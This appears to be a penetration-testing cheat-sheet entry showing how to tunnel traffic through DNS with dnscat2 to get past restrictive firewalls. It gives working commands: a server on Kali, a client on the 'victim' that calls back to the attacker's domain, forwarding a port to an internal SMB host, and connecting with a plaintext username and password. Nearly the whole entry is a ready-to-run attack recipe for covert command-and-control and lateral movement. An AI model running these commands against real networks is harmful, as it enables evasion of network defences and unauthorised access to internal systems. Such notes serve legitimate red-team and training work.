---
title: DNS Tunneling with dnscat2
category: tunnels
subcategory: dns-tunnel
os: linux
command: dnscat2-server domain
tools: dnscat2
---


Use when the firewall blocks everything except DNS. Slow, but reliable through restrictive egress.

### Step 1 - Server on Kali

```bash
dnscat2-server panther.internal
```

### Step 2 - Client on victim

```bash
cd dnscat/
./dnscat panther.internal
```

### Step 3 - Forward a port through the DNS tunnel

In the dnscat2 server console:

```
command (dbmaster01) 1> listen 127.0.0.1:5566 10.10.30.118:445
```

### Step 4 - Use the forwarded port

```bash
smbclient -p 5566 -L //127.0.0.1 -U fin_admin --password=Passw0rd!567
```
